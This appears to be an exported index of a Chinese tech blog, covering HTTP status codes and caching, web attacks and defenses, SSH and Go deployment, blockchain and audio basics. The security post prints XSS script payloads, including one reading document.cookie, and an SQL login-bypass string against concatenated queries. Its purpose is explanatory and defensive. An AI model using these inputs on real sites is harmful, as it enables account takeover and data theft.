多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择 |\n| 301    | Moved Permanently               | 永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替 |\n| 302    | Found                           | 临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI |\n| 303    | See Other                       | 查看其它地址。与301类似。使用GET和POST请求查看               |\n| 304    | Not Modified                    | 未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源 |\n| 305    | Use Proxy                       | 使用代理。所请求的资源必须通过代理访问                       |\n| 306    | Unused                          | 已经被废弃的HTTP状态码                                       |\n| 307    | Temporary Redirect              | 临时重定向。与302类似。使用GET请求重定向                     |\n|        |                                 |                                                              |\n| 400    | Bad Request                     | 客户端请求的语法错误，服务器无法理解                         |\n| 401    | Unauthorized                    | 请求要求用户的身份认证                                       |\n| 402    | Payment Required                | 保留，将来使用                                               |\n| 403    | Forbidden                       | 服务器理解请求客户端的请求，但是拒绝执行此请求               |\n| 404    | Not Found                       | 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置\"您所请求的资源无法找到\"的个性页面 |\n| 405    | Method Not Allowed              | 客户端请求中的方法被禁止                                     |\n| 406    | Not Acceptable                  | 服务器无法根据客户端请求的内容特性完成请求                   |\n| 407    | Proxy Authentication Required   | 请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权 |\n| 408    | Request Time-out                | 服务器等待客户端发送的请求时间过长，超时                     |\n| 409    | Conflict                        | 服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突 |\n| 410    | Gone                            | 客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置 |\n| 411    | Length Required                 | 服务器无法处理客户端发送的不带Content-Length的请求信息       |\n| 412    | Precondition Failed             | 客户端请求信息的先决条件错误                                 |\n| 413    | Request Entity Too Large        | 由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息 |\n| 414    | Request-URI Too Large           | 请求的URI过长（URI通常为网址），服务器无法处理               |\n| 415    | Unsupported Media Type          | 服务器无法处理请求附带的媒体格式                             |\n| 416    | Requested range not satisfiable | 客户端请求的范围无效                                         |\n| 417    | Expectation Failed              | 服务器无法满足Expect的请求头信息                             |\n|        |                                 |                                                              |\n| 500    | Internal Server Error           | 服务器内部错误，无法完成请求                                 |\n| 501    | Not Implemented                 | 服务器不支持请求的功能，无法完成请求                         |\n| 502    | Bad Gateway                     | 作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应 |\n| 503    | Service Unavailable             | 由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中 |\n| 504    | Gateway Time-out                | 充当网关或代理的服务器，未及时从远端服务器获取请求           |\n| 505    | HTTP Version not supported      | 服务器不支持请求的HTTP协议的版本，无法完成处理               |\n\n# 2. http 技术\n\n### 2.1 http 缓存\n\n虽然 HTTP 缓存不是必须的，但重用缓存的资源通常是必要的。然而常见的 HTTP 缓存只能存储 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 响应，对于其他类型的响应则无能为力。缓存的关键主要包括request method和目标URI（一般只有GET请求才会被缓存）。\n\nHTTP/1.1定义的 [`Cache-Control`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cache-Control) 头用来区分对缓存机制的支持情况， 请求头和响应头都支持这个属性。通过它提供的不同的值来定义缓存策略。\n\n+ 没有缓存\n\n  缓存中不得存储任何关于客户端请求和服务端响应的内容。每次由客户端发起的请求都会下载完整的响应内容。\n\n  ```html\n  Cache-Control: no-store\n  ```\n\n+ 缓存但重新验证\n\n  每次有请求发出时，缓存会将此请求发到服务器（注：该请求应该会带有与本地缓存相关的验证字段），服务器端会验证请求中所描述的缓存是否过期，若未过期（注：实际就是返回304），则缓存才使用本地缓存副本。\n\n  ```html\n  Cache-Control: no-cache\n  ```\n\n+ 私有和公共缓存\n\n  + \"public\" 指令表示该响应可以被任何中间人（注：比如中间代理、CDN等）缓存。\n\n    若指定了\"public\"，则一些通常不被中间人缓存的页面（比如 带有HTTP验证信息（帐号密码）的页面 或 某些特定状态码的页面），将会被其缓存。\n\n  + \"private\" 则表示该响应是专用于某单个用户的，中间人不能缓存此响应，该响应只能应用于浏览器私有缓存中。\n\n  ```html\n  Cache-Control: private\n  Cache-Control: public\n  ```\n\n+ 过期\n\n  过期机制中，最重要的指令是 \"`max-age=<seconds>`\"，表示资源能够被缓存（保持新鲜）的最大时间。相对[Expires](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Expires)而言，max-age是距离请求发起的时间的秒数。针对应用中那些不会改变的文件，通常可以手动设置一定的时长以保证缓存有效，例如图片、css、js等静态资源。\n\n  ```html\n  Cache-Control: max-age=31536000\n  ```\n\n+ 验证方式\n\n  当使用了 \"`must-revalidate`\" 指令，那就意味着缓存在考虑使用一个陈旧的资源时，必须先验证它的状态，已过期的缓存将不被使用。\n\n  ```html\n  Cache-Control: must-revalidate\n  ```\n\n**缓存验证**\n\n当向服务端发起缓存校验的请求时，服务端会返回 [`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200) ok表示返回正常的结果或者 [`304`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304) Not Modified(不返回body)表示浏览器可以使用本地缓存文件。304的响应头也可以同时更新缓存文档的过期时间。\n\n+ ETags\n\n  作为缓存的一种强校验器，[`ETag`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag) 响应头是一个对用户代理(User Agent, 下面简称UA)不透明的值。\n\n  如果资源请求的响应头里含有ETag, 客户端可以在后续的请求的头中带上 [`If-None-Match`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None-Match) 头来验证缓存。\n\n+ Last-Modified\n\n   响应头可以作为一种弱校验器。说它弱是因为它只能精确到一秒。\n\n  如果响应头里含有这个信息，客户端可以在后续的请求中带上 [`If-Modified-Since`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Modified-Since) 来验证缓存。\n\n\n\n### 2.2 keep-alive\n\nHttp 1.1 版的最大变化，就是引入了持久连接（persistent connection），即TCP连接默认不关闭，可以被多个请求复用，不用明确声明`Connection: keep-alive`。\n\n\n\n### 2.3 pipelining\n\nHttp 1.1 版还引入了管道机制（pipelining），即在同一个TCP连接里面，客户端可以同时发送多个请求。这样就进一步改进了HTTP协议的效率。\n\n举例来说，客户端需要请求两个资源。以前的做法是，在同一个TCP连接里面，先发送A请求，然后等待服务器做出回应，收到后再发出B请求。管道机制则是允许浏览器同时发出A请求和B请求，但是服务器还是按照顺序，先回应A请求，完成后再回应B请求。\n\n注意：这个pipelining仅仅是限于理论场景下，大部分桌面浏览器仍然会选择默认关闭HTTP pipelining！\n\n\n\n# 3. 参考资料\n\n+ https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ\n+ https://www.ruanyifeng.com/blog/2016/08/http.html\n+ https://zhuanlan.zhihu.com/p/58668946","tags":["http"],"categories":["http"]},{"title":"常见web安全攻击介绍","url":"%2Fp%2F37ebc6b1.html","content":"\n# 1. XSS (**跨站脚本攻击**,落在脚本)\n\nXSS，即 Cross Site Script，中译是跨站脚本攻击；其原本缩写是 CSS，但为了和层叠样式表(Cascading Style Sheet)有所区分，因而在安全领域叫做 XSS。\n\n```javascript\n<script>alert('xss攻击开始')</script>\n<script>alert('1')</script>\n<script>alert('2')</script>\n<script>alert('3\"')</script>\n```\n\n<!-- more -->\n\nXSS 攻击是指攻击者在网站上注入恶意的客户端代码，通过恶意脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。\n\n\n\n### 1.1 举例\n\n+ 在网页 input 或者 textarea 中输入` <script>alert('xss')</script>`或者其他脚本\n+ 直接使用 URL 参数攻击` https://www.baidu.com?jarttoTest=<script>alert(document.cookie)</script>`\n\n\n\n### 1.2 防范\n\n+ HttpOnly 防止劫取 Cookie\n\n+ 用户输入检查\n\n  不要相信用户的任何输入。  对于用户的任何输入要进行检查、过滤和转义。建立可信任的字符和 HTML 标签白名单，对于不在白名单之列的字符或者标签进行过滤或编码。\n\n  在 XSS 防御中，输入检查一般是检查用户输入的数据中是否包含 <，> 等特殊字符，如果存在，则对特殊字符进行过滤或编码，这种方式也称为 XSS Filter。\n\n+ 服务器输出检查\n\n  一般来说，除富文本的输出外，在服务器变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。例如利用 sanitize-html 对输出内容进行有规则的过滤之后再输出到页面中。\n  \n  \n\n# 2. CSRF(跨站请求伪造,落在请求)\n\nCSRF，即 Cross Site Request Forgery，中译是跨站请求伪造，是一种劫持受信任用户向服务器发送非预期请求的攻击方式。\n\n通常情况下，CSRF 攻击是攻击者借助受害者的 Cookie 骗取服务器的信任，可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击服务器，从而在并未授权的情况下执行在权限保护之下的操作。\n\n### 2.1 防范\n\n+ 验证码\n\n  CSRF 攻击往往是在用户不知情的情况下构造了网络请求。而验证码会强制用户必须与应用进行交互，才能完成最终请求。因为通常情况下，验证码能够很好地遏制 CSRF 攻击。\n\n+ Referer Check\n\n  根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。通过 Referer Check，可以检查请求是否来自合法的\"源\"。\n\n  Referer Check 不仅能防范 CSRF 攻击，另一个应用场景是 \"防止图片盗链\"。\n\n+ 添加 token 验证\n\n  要抵御 CSRF，关键在于在请求中放入攻击者所不能伪造的信息，并且该信息不存在于 Cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。\n\n  \n\n# 3. SQL 注入\n\nsql注入的原理是将sql代码伪装到输入参数中，传递到服务器解析并执行的一种攻击手法。也就是说，在一些对server端发起的请求参数中植入一些sql代码，server端在执行sql操作时，会拼接对应参数，同时也将一些sql注入攻击的“sql”拼接起来，导致会执行一些预期之外的操作。\n\n### 3.1 举例\n\n```sql\nsql:=\"SELECT * FROM user WHERE username='\"+username+\"' AND password='\"+password+\"'\"\n```\n\n如果用户的输入的用户名如下，密码任意\n\n```sql\nmyuser' or 'foo' = 'foo' --\n```\n\n那么我们的SQL变成了如下所示：\n\n```sql\nSELECT * FROM user WHERE username='myuser' or 'foo' = 'foo' --'' AND password='xxx'\n```\n\n在SQL里面`--`是注释标记，所以查询语句会在此中断。这就让攻击者在不知道任何合法用户名和密码的情况下成功登录了。\n\n### 3.2 防范\n\n+ 严格限制Web应用的数据库的操作权限，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害。\n\n+ 检查输入的数据是否具有所期望的数据格式，严格限制变量的类型，例如使用regexp包进行一些匹配处理，或者使用strconv包对字符串转化成其他基本类型的数据进行判断。\n\n+ 对进入数据库的特殊字符（'\"\\尖括号&*;等）进行转义处理，或编码转换。Go 的`text/template`包里面的`HTMLEscapeString`函数可以对字符串进行转义处理。\n\n+ 所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中，即不要直接拼接SQL语句。例如使用`database/sql`里面的查询函数`Prepare`和`Query`，或者`Exec(query string, args ...interface{})`。\n\n+ 在应用发布之前建议使用专业的SQL注入检测工具进行检测，以及时修补被发现的SQL注入漏洞。网上有很多这方面的开源工具，例如sqlmap、SQLninja等。\n\n+ 避免网站打印出SQL错误信息，比如类型错误、字段不匹配等，把代码里的SQL语句暴露出来，以防止攻击者利用这些错误信息进行SQL注入。\n\n\n\n# 4. DDos 攻击\n\n Distributed Denial of Service，翻译成中文就是分布式拒绝服务。一般来说是指攻击者利用“肉鸡”对目标网站在较短的时间内发起大量请求，大规模消耗目标网站的主机资源，让它无法正常服务。在线游戏、互联网金融等领域是 DDoS 攻击的高发行业。\n\n### 4.1 举例\n\n+ SYN Flood 攻击\n\n  SYN Flood 就是用户向服务器发送报文后突然死机或掉线，那么服务器在发出应答报文后就无法收到客户端的确认报文（第三次握手无法完成），这时服务器端一般会重试并等待一段时间（至少 30s）后再丢弃这个未完成的连接。\n\n  一个用户出现异常导致服务器的一个线程等待一会儿并不是大问题，但恶意攻击者大量模拟（构造源 IP 去发送 SYN 包）这种情况，服务器端为了维护数以万计的半连接而消耗非常多的资源，结果往往是无暇理睬正常客户的请求，甚至崩溃。从正常客户的角度看来，网站失去了响应，无法访问。\n\n+ CC 攻击\n\n  CC 攻击的原理就是借助代理服务器针对目标系统的消耗资源比较大的页面不断发起正常的请求，造成对方服务器资源耗尽，一直到宕机崩溃。因此在发送 CC 攻击前，我们需要寻找加载比较慢，消耗资源比较多的网页。比如：需要查询数据库的页面、读写硬盘的文件等。相比其它的 DDoS 攻击 CC 更有技术含量一些，这种攻击你见不到真实源 IP。见不到特别大的异常流量，但造成服务器无法进行正常连接。\n\n### 4.2 防范\n\n**1、采用高性能的网络设备**\n\n首先需要保证路由器、交换机、硬件防火墙等网络设备的性能，当发生DDoS攻击的时候，用足够性能的机器、容量去承受攻击，充分利用网络设备保护网络资源是十分有效的应对策略。\n\n**2、保证服务器系统的安全**\n\n首先要确保服务器软件没有任何漏洞，防止攻击者入侵。确保服务器采用最新系统，并打上安全补丁。在服务器上删除未使用的服务，关闭未使用的端口。对于服务器上运行的网站，确保其打了最新的补丁，没有安全漏洞。\n\n**3、充足的网络带宽保证**\n\n网络带宽直接决定了能抗受攻击的能力，假若仅仅有10M带宽的话，无论采取什么措施都很难对抗现在的SYNFlood攻击，当前至少要选择100M的共享带宽，最好的当然是挂在1000M的主干上了。但需要注意的是，主机上的网卡是1000M的并不意味着它的网络带宽就是千兆的，若把它接在100M的交换机上，它的实际带宽不会超过100M，再就是接在100M的带宽上也不等于就有了百兆的带宽，因为网络服务商很可能会在交换机上限制实际带宽为10M，这点一定要搞清楚。\n\n**4、把网站做成静态页面或者伪静态**\n\n大量事实证明，把网站尽可能做成静态页面，不仅能大大提高抗攻击能力，而且还给黑客入侵带来不少麻烦，至少到现在为止关于HTML的溢出还没出现。如果非需要动态脚本调用，那就把它弄到另外一台单独主机去，免的遭受攻击时连累主服务器，当然，适当放一些不做数据库调用脚本还是可以的。\n\n**5、增强操作系统的TCP/IP栈**\n\nWindows操作系统本身就具备一定的抵抗DDoS攻击的能力，只是默认状态下没有开启而已，若开启的话可抵挡约10000个SYN攻击包，若没有开启则仅能抵御数百个，具体怎么开启，还需自行去微软官网了解。\n\n**6、HTTP 请求的拦截**\n\nHTTP 请求的特征一般有两种：IP 地址和 User Agent 字段。比如，恶意请求都是从某个 IP 段发出的，那么把这个 IP 段封掉就行。或者，它们的 User Agent 字段有特征(包含某个特定的词语)，那就把带有这个词语的请求拦截。\n\n**7、部署CDN**\n\nCDN 指的是网站的静态内容分发到多个服务器，用户就近访问，提高速度。因此，CDN 也是带宽扩容的一种方法，可以用来防御 DDOS 攻击。\n\n**8、隐藏服务器的真实IP地址**\n\n服务器前端加CDN中转，如果资金充裕的话，可以购买高防的盾机，用于隐藏服务器真实IP，域名解析使用CDN的IP，所有解析的子域名都使用CDN的IP地址。此外，服务器上部署的其他域名也不能使用真实IP解析，全部都使用CDN来解析。\n\n\n\n# 5. 参考资料\n\n+ https://juejin.im/post/5cef3a3bf265da1b8d160052\n+ https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.4.md\n+ https://www.hi-linux.com/posts/50873.html","tags":["安全"],"categories":["web"]},{"title":"ssh_scp免密和服务器建立信任","url":"%2Fp%2Ffe0e5995.html","content":"\n+ 在mac上生成密钥\n\t\n\t生成两个文件`vultr`  `vultr.pub`\n\t\n\t`ssh-keygen -t rsa`   //passphrase可以为空\n\n+ 发送到远程服务器\n\n\t第一种方式: \n\t\n\t`scp ~/.ssh/vultr.pub root@207.246.80.69:/root/.ssh/authorized_keys`\n\t\n\t第二种方式:\n\t\n\t`ssh-copy-id -i ~/.ssh/vultr.pub root@207.246.80.69`\n\n<!-- more -->\n+ 添加到vultr的ssh key里(这一步可以不做)\n\n\t`https://my.vultr.com/sshkeys/`\n\n\t\n\n+ 一键连接到ssh\n\t\n\t命令: `ssh -i ~/.ssh/vultr root@207.246.80.69`\n\n+ scp files\n\n\t命令: `scp -i ~/.ssh/vultr files root@207.246.80.69:/root`\n","tags":["ssh"],"categories":["系统"]},{"title":"linux部署golang的方式","url":"%2Fp%2F8956ebfb.html","content":"\n\n### 通过ssh文件上传到服务器\n\n```\nscp -i /Users/liuwei/.ssh/aws.pem -C -r /Users/liuwei/golang/src/web ubuntu@ec2-54-191-9-26.us-west-2.compute.amazonaws.com:/home/ubuntu\n```\n\naws.pem chmod 400\n\nscp  -C 加一个可能会更快\n\n### 发行部署\n\nGo 语言的应用最后编译之后是一个二进制文件，你只需要 copy 这个应用到服务器上，运行起来就行。beego 由于带有几个静态文件、配置文件、模板文件三个目录，所以用户部署的时候需要同时 copy 这三个目录到相应的部署应用之下，下面以我实际的应用部署为例：\n\n<!-- more -->\n```\n$ mkdir /opt/app/beepkg\n$ cp beepkg /opt/app/beepkg\n$ cp -fr views /opt/app/beepkg\n$ cp -fr static /opt/app/beepkg\n$ cp -fr conf /opt/app/beepkg\n\n```\n这样在 /opt/app/beepkg 目录下面就会显示如下的目录结构：\n\n```\n.\n├── conf\n│   ├── app.conf\n├── static\n│   ├── css\n│   ├── img\n│   └── js\n└── views\n    └── index.tpl\n├── beepkg\n\n```\n这样我们就已经把我们需要的应用搬到服务器了，那么接下来就可以开始部署了。\n\n就是一共上传3个文件夹和1个可执行文件\n\n### 1. 独立部署\n在 linux 下面部署，我们可以利用 nohup 命令，把应用部署在后端，如下所示：\n\n```\nnohup ./beepkg &\n```\n这样你的应用就跑在了 Linux 系统的守护进程\n\n\n\n### 2. supervisord 管理\nsupervisord 是用 Python 实现的一款非常实用的进程管理工具，supervisord 还要求管理的程序是非 daemon 程序，supervisord 会帮你把它转成 daemon 程序，因此如果用 supervisord 来管理 nginx 的话，必须在 nginx 的配置文件里添加一行设置 daemon off 让 nginx 以非 daemon 方式启动。\n\n1. 安装 setuptools\n\n```\nwget http://pypi.python.org/packages/2.7/s/setuptools/setuptools-0.6c11-py2.7.egg\nsh setuptools-0.6c11-py2.7.egg\neasy_install supervisor\necho_supervisord_conf >/etc/supervisord.conf\nmkdir /etc/supervisord.conf.d\n```\n\n2. 修改配置 /etc/supervisord.conf\n\n```\n[include]\nfiles = /etc/supervisord.conf.d/*.conf\n```\n\n3. 新建管理的应用\ncd /etc/supervisord.conf.d\nvim beepkg.conf\n配置文件：\n\n```\n[program:beepkg]\ndirectory = /opt/app/beepkg\ncommand = /opt/app/beepkg/beepkg\nautostart = true\nstartsecs = 5\nuser = root\nredirect_stderr = true\nstdout_logfile = /var/log/supervisord/beepkg.log\n```\n\n##### supervisord 管理\n\nsupervisord 安装完成后有两个可用的命令行 supervisord 和 supervisorctl，命令使用解释如下：\n\n  ● supervisord，初始启动 Supervisord，启动、管理配置中设置的进程。\n\n  ● supervisorctl stop programxxx，停止某一个进程(programxxx)，programxxx 为 [program:beepkg] 里配置的值，这个示例就是 beepkg。\n\n  ● supervisorctl start programxxx，启动某个进程\n\n  ● supervisorctl restart programxxx，重启某个进程\n\n  ● supervisorctl stop groupworker: ，重启所有属于名为 groupworker 这个分组的进程(start,restart 同理)\n\n  ● supervisorctl stop all，停止全部进程，注：start、restart、stop 都不会载入最新的配置文件。\n\n  ● supervisorctl reload，载入最新的配置文件，停止原有进程并按新的配置启动、管理所有进程。\n\n  ● supervisorctl update，根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启。\n\n注意：显示用 stop 停止掉的进程，用 reload 或者 update 都不会自动重启。\n\n\n> 自己的配置\n\n```\nweb.conf\n\n[program:web]\ndirectory = /home/ubuntu/web\ncommand = /home/ubuntu/web/web\nautostart = true\nstartsecs = 5\nuser = root\nredirect_stderr = true\nstdout_logfile = /var/log/supervisord/web.log\n```\n\nsudo supervisord //启动\nsudo supervisorctl stop web //结束\n\n\n\n### 3. nginx部署\n\n1 安装nginx \n\n```\nsudo apt-get install nginx\n```\n\nUbuntu安装之后的文件结构大致为：\n\n  ● 所有的配置文件都在/etc/nginx下，并且每个虚拟主机已经安排在了/etc/nginx/sites-available下\n\n  ● 程序文件在/usr/sbin/nginx\n\n  ● 日志放在了/var/log/nginx中\n\n  ● 并已经在/etc/init.d/下创建了启动脚本nginx\n\n  ● 默认的虚拟主机的目录设置在了/var/www/nginx-default (有的版本 默认的虚拟主机的目录设置在了/var/www, 请参考/etc/nginx/sites-available里的配置)\n\n2 启动nginx\n\n```\nsudo /etc/init.d/nginx start\n```\n直接访问ip http://54.191.9.26/ 可以看到nginx安装成功\n\n\n3 处理golang\n\nGo 是一个独立的 HTTP 服务器，但是我们有些时候为了 nginx 可以帮我做很多工作，例如访问日志，cc 攻击，静态服务等，nginx 已经做的很成熟了，Go 只要专注于业务逻辑和功能就好，所以通过 nginx 配置代理就可以实现多应用同时部署，如下就是典型的两个应用共享 80 端口，通过不同的域名访问，反向代理到不同的应用。\n\n```\nserver {\n    listen       80;\n    server_name  .a.com;\n\n    charset utf-8;\n    access_log  /home/a.com.access.log;\n\n    location /(css|js|fonts|img)/ {\n        access_log off;\n        expires 1d;\n\n        root \"/path/to/app_a/static\";\n        try_files $uri @backend;\n    }\n\n    location / {\n        try_files /_not_exists_ @backend;\n    }\n\n    location @backend {\n        proxy_set_header X-Forwarded-For $remote_addr;\n        proxy_set_header Host            $http_host;\n\n        proxy_pass http://127.0.0.1:8080;\n    }\n}\n\nserver {\n    listen       80;\n    server_name  .b.com;\n\n    charset utf-8;\n    access_log  /home/b.com.access.log  main;\n\n    location /(css|js|fonts|img)/ {\n        access_log off;\n        expires 1d;\n\n        root \"/path/to/app_b/static\";\n        try_files $uri @backend;\n    }\n\n    location / {\n        try_files /_not_exists_ @backend;\n    }\n\n    location @backend {\n        proxy_set_header X-Forwarded-For $remote_addr;\n        proxy_set_header Host            $http_host;\n\n        proxy_pass http://127.0.0.1:8081;\n    }\n}\n```\n\n> 自己的配置\n\nsudo vi /etc/nginx/sites-available/default\n\n把 default 注释掉\n\n```\nserver {\n        listen       80;\n        server_name  .xuanyueting.top;\n\n        charset utf-8;\n        access_log  /home/ubuntu/web/xuanyueting.log;\n\n        location /(css|js|fonts|img)/ {\n                access_log off;\n                expires 1d;\n\n                root \"/home/ubuntu/web/static\";\n                try_files $uri @backend;\n        }\n        location / {\n                try_files /_not_exists_ @backend;\n        }\n\n        location @backend {\n                proxy_set_header x-forwarded-for $remote_addr;\n                proxy_set_header host            $http_host;\n\n                proxy_pass http://127.0.0.1:8080;\n        }\n}\n```\n\n\n","tags":["golang"],"categories":["3_golang杂项"]},{"title":"区块链基础","url":"%2Fp%2Feb2c6f22.html","content":"\n# 区块链\n\n区块链属于一种去中心化的记录技术。参与到系统上的节点，可能不属于同一组织、彼此无需信任；区块链数据由所有节点共同维护，每个参与维护节点都能复制获得一份完整记录的拷贝。\n\n### 特点\n跟传统的记账技术相比，其特点应该包括：\n\n* 维护一条不断增长的链，只可能添加记录，而发生过的记录都不可篡改；\n* 去中心化，或者说多中心化，无需集中的控制而能达成共识，实现上尽量分布式；\n* 通过密码学的机制来确保交易无法抵赖和破坏，并尽量保护用户信息和记录的隐私性。\n\n\n### 基本原理\n区块链的基本原理理解起来并不难。基本概念包括：\n\n* 交易（Transaction）：一次操作，导致账本状态的一次改变，如添加一条记录；\n* 区块（Block）：记录一段时间内发生的交易和状态结果，是对当前账本状态的一次共识；\n* 链（Chain）：由一个个区块按照发生顺序串联而成，是整个状态变化的日志记录。\n<!-- more -->\n\n### 分类\n根据参与者的不同，可以分为公开（Public）链、联盟（Consortium）链和私有（Private）链。\n目前来看，公开链将会更多的吸引社区和媒体的眼球，但更多的商业价值应该在联盟链和私有链上。\n\n根据使用目的和场景的不同，又可以分为以数字货币为目的的货币链，以记录产权为目的的产权链，以众筹为目的的众筹链等。\n\n### 存储\n首先，区块链不是数据库。虽然区块链也可以用来存储数据，但它要解决的问题是多方的互信问题。单纯从存储数据角度，它的效率可能不高，笔者也不推荐把大量的原始数据放到区块链上。\n\n### 计算\n区块链技术还能带来更通用的计算能力。Hyperledger 和 Ethereum 就试图做类似的事情，基于区块链再做一层平台层，让别人基于平台开发应用变得更简单。\n\n\n\n\n# 分布式问题\n\n### 一致性\n\n理想的分布式系统一致性应该满足：\n\n* 可终止性（Termination）：一致的结果在有限时间内能完成；\n* 共识性（Consensus）：不同节点最终完成决策的结果应该相同；\n* 合法性（Validity）：决策的结果必须是其它进程提出的提案。\n\n\n实际上，越强的一致性要求往往意味着越弱的性能。\n\n\n### FLP 不可能性原理\n\nFLP 不可能原理：在网络可靠，存在节点失效（即便只有一个）的最小化异步模型系统中，不存在一个可以解决一致性问题的确定性算法。\n\nFLP 不可能原理实际上告诉人们，不要浪费时间去为异步分布式系统设计在任意场景下都能实现共识的算法。\n\n\n### CAP 原理\n\n* 一致性（Consistency）：任何操作应该都是原子的，发生在后面的事件能看到前面事件发生导致的结果，注意这里指的是强一致性；\n* 可用性（Availablity）：在有限时间内，任何非失败节点都能应答请求；\n* 分区容忍性（Partition）：网络可能发生分区，即节点之间的通信不可保障。\n\n1. 弱化一致性  对结果一致性不敏感的应用，可以允许在新版本上线后过一段时间才更新成功，期间不保证一致性。\n\n2. 弱化可用性  对结果一致性很敏感的应用，例如银行取款机，当系统故障时候会拒绝服务。MongoDB、Redis 等为此设计。Paxos、Raft 等算法，主要处理这种情况。\n\n3. 弱化分区容忍性  现实中，网络分区出现概率减小，但较难避免。某些关系型数据库、ZooKeeper 即为此设计。\n\n\n### ACID 原则\n\n\n即 Atomicity（原子性）、Consistency（一致性）、Isolation（隔离性）、Durability（持久性）。\n\nACID 原则描述了对分布式数据库的一致性需求，同时付出了可用性的代价。\n\n* Atomicity：每次操作是原子的，要么成功，要么不执行；\n* Consistency：数据库的状态是一致的，无中间状态；\n* Isolation：各种操作彼此互相不影响；\n* Durability：状态的改变是持久的，不会失效。\n\n一个与之相对的原则是 BASE（Basic Availiability，Soft state，Eventually Consistency），牺牲掉对一致性的约束（最终一致性），来换取一定的可用性。\n\n\n# 密码学\n\n\n### hash\n\n一个优秀的 hash 算法，将能实现：\n\n* 正向快速：给定明文和 hash 算法，在有限时间和有限资源内能计算出 hash 值。\n* 逆向困难：给定（若干） hash 值，在有限时间内很难（基本不可能）逆推出明文。\n* 输入敏感：原始输入信息修改一点信息，产生的 hash 值看起来应该都有很大不同。\n* 冲突避免：很难找到两段内容不同的明文，使得它们的 hash 值一致（发生冲突）\n\n\n\n### 加解密\n\n根据加解密的密钥是否相同，算法可以分为对称加密（symmetric cryptography，又称公共密钥加密，common-key cryptography）和非对称加密(asymmetric cryptography，又称公钥加密，public-key cryptography)。两种模式适用于不同的需求，恰好形成互补，很多时候也可以组合使用，形成混合加密机制。\n\n\n* 对称加密\n\n优点是加解密效率高（速度快，空间占用小），加密强度高。\n\n缺点是参与多方都需要持有密钥，一旦有人泄露则安全性被破坏；另外如何在不安全通道下分发密钥也是个问题。\n\n适用于大量数据的加解密；不能用于签名场景；需要提前分发密钥。\n\n* 非对称加密\n\n非对称加密是现代密码学历史上最为伟大的发明，可以很好的解决对称加密需要的提前分发密钥问题。\n\n顾名思义，加密密钥和解密密钥是不同的，分别称为公钥和私钥。\n公钥一般是公开的，人人可获取的，私钥一般是个人自己持有，不能被他人获取。\n优点是公私钥分开，不安全通道也可使用。\n缺点是加解密速度慢，一般比对称加解密算法慢两到三个数量级；同时加密强度相比对称加密要差。\n\n一般适用于签名场景或密钥协商，不适于大量数据的加解密。\n\n* 混合加密机制\n\n即先用计算复杂度高的非对称加密协商一个临时的对称加密密钥（会话密钥，一般相对内容来说要短的多），然后双方再通过对称加密对传递的大量数据进行加解密处理。\n\n典型的场景是现在大家常用的 HTTPS 机制。\n\n\n\n","tags":["区块链"],"categories":["计算机基础"]},{"title":"音频基础","url":"%2Fp%2F279c3cd4.html","content":"\n\n### 音频基础\n\n当前，我们所说的音频，都是数字音频。数字音频由采样频率、采样精度、声音通道数三个部分组成。\n\n采样频率：既采样率，指记录声音时每秒的采样个数，它用赫兹(Hz)来表示。\n采样精度：指记录声音的动态范围，它以位(Bit)为单位。\n声音通道：既声道数（1-8个）。\n\n采样率根据使用类型不同大概有以下几种（k既千位符号，1khz=1000hz）：\n8khz：电话等使用，对于记录人声已经足够使用。\n22.05khz：广播使用频率。\n44.1kb：音频CD。\n48khz：DVD、数字电视中使用。\n96khz-192khz：DVD-Audio、蓝光高清等使用。\n\n采样精度常用范围为8bit-32bit，而CD中一般都使用16bit。\n<!-- more -->\n\n\n音频的比特率，实际上就是压缩比例。\n但比特率本身并不对文件的质量有直接影响，例如我们把128kb的文件作为源文件，即使转换成320kb的文件，其音质依然不会比128kb好。\n那么比特率中的数字和字母到底是什么意思呢？首先看128k的全称“128kbps”，我们试着分解一下：128是数字，k是千位符，b是单位，s是秒，ps其实就是“/s”。这样来看，128kbps就是128kb/s。也就是每秒128kb。\n\n\n\n### speex格式录音参数:\n\n```\nquality = 9  \t                       \t\t//speex质量,值越大质量越好,文件越大  open()的参数\nspeex_version = \"speex-1.2rc\"      